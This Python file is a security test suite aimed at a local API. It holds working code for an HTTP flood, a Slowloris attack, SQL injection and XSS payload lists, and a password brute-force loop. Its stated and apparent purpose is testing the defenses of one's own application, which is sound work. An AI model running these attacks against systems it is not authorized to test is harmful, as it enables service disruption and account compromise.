"""
Security Attack Simulation Scripts for Learning and Testing.

WARNING: These scripts are for AUTHORIZED TESTING ONLY on your own systems.
Use for educational purposes, security research, and testing your own defenses.
"""
import asyncio
import random
import time
from typing import List
import httpx
from faker import Faker


fake = Faker()


class AttackSimulator:
    """Base class for attack simulations."""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.results = {
            "total_requests": 0,
            "successful": 0,
            "failed": 0,
            "rate_limited": 0,
            "blocked": 0,
        }

    def print_summary(self):
        """Print attack simulation summary."""
        print("\n" + "="*60)
        print("ATTACK SIMULATION SUMMARY")
        print("="*60)
        for key, value in self.results.items():
            print(f"{key:20s}: {value}")
        print("="*60)


class DDoSSimulator(AttackSimulator):
    """
    Simulates Distributed Denial of Service (DDoS) attacks.
    Tests rate limiting and system resilience.
    """

    async def http_flood(self, duration: int = 60, requests_per_second: int = 100):
        """
        Simulate HTTP flood attack.

        Args:
            duration: Attack duration in seconds
            requests_per_second: Number of requests per second
        """
        print(f"\n[DDoS] Starting HTTP flood attack...")
        print(f"Duration: {duration}s, RPS: {requests_per_second}")

        start_time = time.time()
        endpoints = [
            "/api/v1/products/",
            "/api/v1/products/1",
            "/health",
        ]

        async with httpx.AsyncClient(timeout=5.0) as client:
            while time.time() - start_time < duration:
                tasks = []
                for _ in range(requests_per_second):
                    endpoint = random.choice(endpoints)
                    url = f"{self.base_url}{endpoint}"
                    tasks.append(self._make_request(client, url))

                results = await asyncio.gather(*tasks, return_exceptions=True)

                for result in results:
                    if isinstance(result, Exception):
                        self.results["failed"] += 1
                    elif result == 429:
                        self.results["rate_limited"] += 1
                    elif result == 200:
                        self.results["successful"] += 1
                    else:
                        self.results["blocked"] += 1

                await asyncio.sleep(1)

        self.print_summary()

    async def _make_request(self, client: httpx.AsyncClient, url: str) -> int:
        """Make a single request and return status code."""
        try:
            response = await client.get(url)
            self.results["total_requests"] += 1
            return response.status_code
        except Exception as e:
            self.results["total_requests"] += 1
            raise

    async def slowloris_attack(self, duration: int = 60, connections: int = 100):
        """
        Simulate Slowloris attack - slow HTTP requests to exhaust connections.

        Args:
            duration: Attack duration in seconds
            connections: Number of concurrent slow connections
        """
        print(f"\n[DDoS] Starting Slowloris attack...")
        print(f"Duration: {duration}s, Connections: {connections}")

        start_time = time.time()

        async def slow_request():
            try:
                async with httpx.AsyncClient(timeout=None) as client:
                    # Send partial request and keep connection open
                    async with client.stream("GET", f"{self.base_url}/api/v1/products/") as response:
                        # Read very slowly
                        async for chunk in response.aiter_bytes(chunk_size=1):
                            await asyncio.sleep(0.1)
                            if time.time() - start_time > duration:
                                break
                        self.results["successful"] += 1
            except Exception:
                self.results["failed"] += 1
            finally:
                self.results["total_requests"] += 1

        tasks = [slow_request() for _ in range(connections)]
        await asyncio.gather(*tasks, return_exceptions=True)

        self.print_summary()


class SQLInjectionSimulator(AttackSimulator):
    """
    Simulates SQL Injection attacks to test input validation.
    """

    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', 'password'--",
    ]

    async def test_sql_injection(self):
        """Test SQL injection on various endpoints."""
        print("\n[SQL Injection] Testing SQL injection vulnerabilities...")

        async with httpx.AsyncClient(timeout=10.0) as client:
            # Test login endpoint
            for payload in self.SQL_INJECTION_PAYLOADS:
                login_data = {
                    "email": payload,
                    "password": payload,
                }

                try:
                    response = await client.post(
                        f"{self.base_url}/api/v1/auth/login",
                        json=login_data
                    )
                    self.results["total_requests"] += 1

                    if response.status_code == 200:
                        print(f"[!] VULNERABILITY: Payload succeeded: {payload}")
                        self.results["successful"] += 1
                    elif response.status_code == 401:
                        self.results["blocked"] += 1
                    elif response.status_code == 422:
                        self.results["blocked"] += 1

                except Exception:
                    self.results["failed"] += 1

            # Test search endpoint
            for payload in self.SQL_INJECTION_PAYLOADS:
                try:
                    response = await client.get(
                        f"{self.base_url}/api/v1/products/",
                        params={"search": payload}
                    )
                    self.results["total_requests"] += 1

                    if response.status_code == 200:
                        # Check if response contains unexpected data
                        data = response.json()
                        if "error" in str(data).lower() or "sql" in str(data).lower():
                            print(f"[!] POTENTIAL VULNERABILITY: {payload}")
                            self.results["successful"] += 1
                        else:
                            self.results["blocked"] += 1

                except Exception:
                    self.results["failed"] += 1

        self.print_summary()


class XSSSimulator(AttackSimulator):
    """
    Simulates Cross-Site Scripting (XSS) attacks.
    """

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
    ]

    async def test_xss(self):
        """Test XSS vulnerabilities."""
        print("\n[XSS] Testing XSS vulnerabilities...")

        async with httpx.AsyncClient(timeout=10.0) as client:
            # First register a user
            email = fake.email()
            password = "Test123456!"

            register_data = {
                "email": email,
                "username": fake.user_name(),
                "password": password,
            }

            await client.post(f"{self.base_url}/api/v1/auth/register", json=register_data)

            # Login
            login_response = await client.post(
                f"{self.base_url}/api/v1/auth/login",
                json={"email": email, "password": password}
            )

            if login_response.status_code != 200:
                print("[!] Could not authenticate for XSS testing")
                return

            token = login_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            # Test XSS in product creation
            for payload in self.XSS_PAYLOADS:
                product_data = {
                    "title": payload,
                    "description": payload,
                    "price": 100.0,
                    "condition": "new",
                    "category_id": 1,
                }

                try:
                    response = await client.post(
                        f"{self.base_url}/api/v1/products/",
                        json=product_data,
                        headers=headers
                    )
                    self.results["total_requests"] += 1

                    if response.status_code == 201:
                        data = response.json()
                        # Check if payload is escaped in response
                        if payload in str(data):
                            print(f"[!] POTENTIAL VULNERABILITY: Unescaped XSS: {payload}")
                            self.results["successful"] += 1
                        else:
                            self.results["blocked"] += 1
                    else:
                        self.results["blocked"] += 1

                except Exception:
                    self.results["failed"] += 1

        self.print_summary()


class BruteForceSimulator(AttackSimulator):
    """
    Simulates brute force attacks on authentication.
    """

    async def brute_force_login(self, attempts: int = 100):
        """
        Simulate brute force login attempts.

        Args:
            attempts: Number of login attempts
        """
        print(f"\n[Brute Force] Testing brute force protection...")
        print(f"Attempts: {attempts}")

        async with httpx.AsyncClient(timeout=10.0) as client:
            target_email = "test@example.com"

            for i in range(attempts):
                login_data = {
                    "email": target_email,
                    "password": f"password{i}",
                }

                try:
                    response = await client.post(
                        f"{self.base_url}/api/v1/auth/login",
                        json=login_data
                    )
                    self.results["total_requests"] += 1

                    if response.status_code == 200:
                        print(f"[!] LOGIN SUCCESSFUL with password: password{i}")
                        self.results["successful"] += 1
                        break
                    elif response.status_code == 429:
                        print(f"[+] Rate limiting active at attempt {i+1}")
                        self.results["rate_limited"] += 1
                    else:
                        self.results["blocked"] += 1

                    # Small delay to avoid overwhelming the server
                    await asyncio.sleep(0.1)

                except Exception:
                    self.results["failed"] += 1

        self.print_summary()


async def main():
    """Run all attack simulations."""
    base_url = "http://localhost:8000"

    print("="*60)
    print("SECURITY ATTACK SIMULATION SUITE")
    print("="*60)
    print(f"Target: {base_url}")
    print("WARNING: For authorized testing only!")
    print("="*60)

    # DDoS Simulations
    ddos = DDoSSimulator(base_url)
    await ddos.http_flood(duration=10, requests_per_second=50)

    # SQL Injection
    sqli = SQLInjectionSimulator(base_url)
    await sqli.test_sql_injection()

    # XSS
    xss = XSSSimulator(base_url)
    await xss.test_xss()

    # Brute Force
    brute = BruteForceSimulator(base_url)
    await brute.brute_force_login(attempts=50)

    print("\n" + "="*60)
    print("ALL SIMULATIONS COMPLETED")
    print("="*60)


if __name__ == "__main__":
    asyncio.run(main())
